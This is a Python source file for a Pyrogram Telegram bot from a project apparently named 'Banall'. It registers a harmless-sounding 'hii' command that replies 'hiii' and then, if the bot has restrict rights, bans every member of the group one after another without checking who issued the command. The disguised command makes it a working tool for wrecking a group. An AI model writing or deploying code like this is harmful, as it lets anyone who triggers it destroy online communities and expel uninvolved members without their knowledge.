from pyrogram import Client, filters, enums
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from pyrogram import Client, errors
from pyrogram.enums import ChatMemberStatus, ParseMode
from pyrogram.enums import ChatType
import asyncio
import os
from os import getenv
import traceback
from pyrogram import filters, Client
from pyrogram.types import Message
from unidecode import unidecode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import random 
import time
import random
import requests

from Banall import app

@app.on_message(filters.command(["hii"], prefixes=[".","/","!"]) & filters.group)
async def ban_all(client, msg):
    chat_id = msg.chat.id    
    LOL = await msg.reply_text("hiii")
    app = await client.get_me()
    BOT_ID = app.id
    x = 0
    bot = await client.get_chat_member(chat_id, BOT_ID)
    bot_permission = bot.privileges.can_restrict_members == True    
    if bot_permission:
        banned_users = []
        async for member in client.get_chat_members(chat_id):       
            try:
                await client.ban_chat_member(chat_id, member.user.id) 
                x += 1
                await LOL.edit_text(f"✫ ᴜꜱᴇʀꜱ : {x} ✫")
            except Exception:
                pass
    else:
        await msg.reply_text("ɪ ᴅᴏɴ'ᴛ ʜᴀᴠᴇ ᴛʜᴇ ʀɪɢʜᴛ ᴛᴏ ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀs.")
        
